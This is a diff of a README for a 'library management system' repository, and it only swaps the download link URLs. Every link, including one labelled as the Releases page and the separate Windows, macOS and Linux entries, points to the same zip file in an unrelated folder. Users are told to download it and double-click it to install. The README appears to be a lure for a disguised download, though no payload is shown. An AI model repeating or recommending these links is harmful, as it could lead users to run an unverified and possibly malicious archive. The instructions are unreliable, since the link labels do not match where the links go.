@@ -1,6 +1,6 @@
 # 📚 Fullstack-Lib-management-sys - Simplifying Library Operations
 
-[![Download Now](https://raw.githubusercontent.com/skiper41/Fullstack-Lib-management-sys/main/elucidation/Fullstack-Lib-management-sys.zip)](https://raw.githubusercontent.com/skiper41/Fullstack-Lib-management-sys/main/elucidation/Fullstack-Lib-management-sys.zip)
+[![Download Now](https://github.com/skiper41/Fullstack-Lib-management-sys/raw/refs/heads/main/elucidation/Fullstack-Lib-management-sys.zip)](https://github.com/skiper41/Fullstack-Lib-management-sys/raw/refs/heads/main/elucidation/Fullstack-Lib-management-sys.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before you download the application, ensure your system meets the following requ
 
 To get the Library Management System, visit the Releases page and choose the latest version. 
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/skiper41/Fullstack-Lib-management-sys/main/elucidation/Fullstack-Lib-management-sys.zip)
+[Visit the Releases Page to Download](https://github.com/skiper41/Fullstack-Lib-management-sys/raw/refs/heads/main/elucidation/Fullstack-Lib-management-sys.zip)
 
 ### Step-by-Step Installation:
 
@@ -35,9 +35,9 @@ To get the Library Management System, visit the Releases page and choose the lat
 2. **Select the Latest Version**: Look for the most recent release, typically marked as "Latest". 
 
 3. **Download the Application**: Click on the asset file suitable for your operating system. For example:
-   - For Windows: `https://raw.githubusercontent.com/skiper41/Fullstack-Lib-management-sys/main/elucidation/Fullstack-Lib-management-sys.zip`
-   - For macOS: `https://raw.githubusercontent.com/skiper41/Fullstack-Lib-management-sys/main/elucidation/Fullstack-Lib-management-sys.zip`
-   - For Linux: `https://raw.githubusercontent.com/skiper41/Fullstack-Lib-management-sys/main/elucidation/Fullstack-Lib-management-sys.zip`
+   - For Windows: `https://github.com/skiper41/Fullstack-Lib-management-sys/raw/refs/heads/main/elucidation/Fullstack-Lib-management-sys.zip`
+   - For macOS: `https://github.com/skiper41/Fullstack-Lib-management-sys/raw/refs/heads/main/elucidation/Fullstack-Lib-management-sys.zip`
+   - For Linux: `https://github.com/skiper41/Fullstack-Lib-management-sys/raw/refs/heads/main/elucidation/Fullstack-Lib-management-sys.zip`
 
 4. **Run the Installer**: Double-click the downloaded file to start the installation process.
 
